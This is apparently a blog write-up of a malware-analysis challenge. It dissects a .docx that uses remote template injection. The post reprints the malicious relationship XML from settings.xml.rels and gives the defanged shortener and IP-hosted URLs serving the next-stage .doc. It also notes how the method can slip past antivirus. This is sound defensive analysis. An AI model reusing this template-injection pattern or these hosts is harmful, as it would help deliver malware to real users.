---
title: Samplepedia - Malicious .docx Utilizing Remote Templates Analysis Writeup
date: 2026-1-25
categories:
  - malware
  - reversing
  - writeups
tags:
  - samplepedia
  - msoffice
---
#### Intro
This is an easy-tagged challenge on [samplepedia](https://samplepedia.cc). Similar to the VSTO challenge ([challenge link](<https://samplepedia.cc/sample/56f5623daa470bee190ae0ecd961be8e6df71c8da1ccf7b268fe876b84c183d9/77/>) and [writeup](https://ge0lev.github.io/posts/samplepedia-malicious-.docx-analysis-writeup/)), this particular sample is interesting as well because it does not utilize an embedded macro but uses a novel technique - Remote Template Injection - which exploits the ability to use a custom template on MS Office in order to load a malicious template, either remotely or locally. This can make the initial MS Office file appear "clean" and possibly evade antivirus or mail protection solution.

Challenge URL: <https://samplepedia.cc/sample/29325e23a684f782db14a1bf0dc56c65228e666d1f561808413a735000de3515/76/>

#### Goal
Where does this file load the next stage from?

#### Analysis
Examining the file with *oleid* gives us the following:
```
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description
--------------------+--------------------+----------+--------------------------
File format         |MS Word 2007+       |info      |
                    |Document (.docx)    |          |
--------------------+--------------------+----------+--------------------------
Container format    |OpenXML             |info      |Container type
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted
--------------------+--------------------+----------+--------------------------
VBA Macros          |No                  |none      |This file does not contain
                    |                    |          |VBA macros.
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.
--------------------+--------------------+----------+--------------------------
External            |1                   |HIGH      |External relationships
Relationships       |                    |          |found: attachedTemplate -
                    |                    |          |use oleobj for details
--------------------+--------------------+----------+--------------------------
```

Based on the above, we see that the file does not contain any macros but does contain *External Relationships*. 

At this point, if we follow the suggestion of oleid and use *oleobj* we pretty much get our answer. Still, we'll try to find the next stage in a more manual manner.

By extracting the file as an archive with 7zip, we get the following directory structure:
```
29325e23a684f782db14a1bf0dc56c65228e666d1f561808413a735000de3515~:.
│   [Content_Types].xml
│   
├───docProps
│       app.xml
│       core.xml
│       
├───word
│   │   document.xml
│   │   endnotes.xml
│   │   fontTable.xml
│   │   footer1.xml
│   │   footer2.xml
│   │   footer3.xml
│   │   footnotes.xml
│   │   header1.xml
│   │   header2.xml
│   │   header3.xml
│   │   settings.xml
│   │   styles.xml
│   │   webSettings.xml
│   │   
│   ├───embeddings
│   │       oleObject1.bin
│   │       oleObject2.bin
│   │       
│   ├───media
│   │       image1.emf
│   │       image2.emf
│   │       image3.png
│   │       
│   ├───theme
│   │       theme1.xml
│   │       
│   └───_rels
│           document.xml.rels
│           header2.xml.rels
│           settings.xml.rels
│           
└───_rels
        .rels
        
```

Checking the *_rels* relationships directory we see the file *settings.xml.rels* which contains the following XML code:
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
	<Relationship Id="rId1" Target="hxxp://someofthelovercantbuyhappinessfromthe@shtu[.]be/5f0848" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"/>
</Relationships>
```

indicating that the .docx attempts to load a *Remote Template* file from the URL:
```
hxxp://someofthelovercantbuyhappinessfromthe@shtu[.]be/5f0848
```

Our findings can be further verified by the output of oleobj:
```
oleobj 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

-------------------------------------------------------------------------------
File: '29325e23a684f782db14a1bf0dc56c65228e666d1f561808413a735000de3515'
Found relationship 'attachedTemplate' with external link hxxp://someofthelovercantbuyhappinessfromthe@shtu[.]be/5f0848
```

Regarding the URL, it appears that shtu.be is a URL shortener website which redirects the request to
```
hxxp://107[.]173[.]4[.]15/gbn/mydearcutieireallyloveryoualwaysforgreatthingshappenedinsideofusforloverstogetreadyforthepointounderstandtheupdationforproccess.doc
```

Note that every instance of suspicious URLs have been defanged.

Unfortunately, it appears the the URL is no longer up so further analysis of the next stage  is not possible...

#### Helpful Resources
* <https://www.cyfirma.com/research/living-off-the-land-the-mechanics-of-remote-template-injection-attack/>
* <https://tho-le.medium.com/remote-ms-office-template-injection-ffbe0d81512d> 
